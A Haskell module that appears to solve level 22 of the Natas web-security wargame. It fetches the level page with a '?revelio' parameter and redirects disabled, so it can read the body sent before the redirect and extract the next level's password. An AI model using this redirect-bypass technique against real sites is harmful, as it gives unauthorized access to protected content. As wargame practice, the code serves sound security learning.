module Natas.Natas22 where

import           Data.Text          (Text)
import           Data.Text.Encoding (decodeUtf8)
import           Safe               (headMay, lastMay)

import           Network.Wreq       (redirects)

import           Control.Lens

import           Natas.Natas
import           Natas.Parse

solution :: Solution
solution = do
  let req = getLevel' 22 (parentUri 22 ++ "/?revelio") (redirects .~ 0)
  caughtBody <- catchResponseBodyHandler decodeUtf8 (reqBody <$> req)
  attemptParse caughtBody

attemptParse :: Text -> IO (Maybe Text)
attemptParse body =
  let match = headMay (workupBody' extractPassword body)
  in pure $ match >>= lastMay
